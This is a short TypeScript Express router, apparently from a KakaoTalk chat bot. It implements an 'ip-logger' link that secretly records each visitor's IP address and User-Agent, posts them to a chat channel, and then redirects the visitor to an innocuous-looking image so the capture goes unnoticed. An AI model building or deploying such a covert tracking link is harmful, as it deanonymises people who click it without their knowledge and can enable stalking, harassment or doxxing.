import express from 'express';
import { TalkChannel } from 'loco-client';

const loggerMap = new Map<string, TalkChannel>();

export const setLoggerMap = (id: string, channel: TalkChannel) => {
  loggerMap.set(id, channel);
};

const featuresRouter = express.Router();

featuresRouter.get('/ip-logger/:id', (req, res) => {
  const id = req.params.id;
  const ip =
    req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const userAgent = req.headers['user-agent'] || 'Unknown';

  const channel = loggerMap.get(id);

  if (!channel) return;

  channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);

  res.redirect(
    'https://github.com/user-attachments/assets/2d54d27d-dc4b-49c3-807a-7c6bce3023a6'
  );
});

export { featuresRouter };
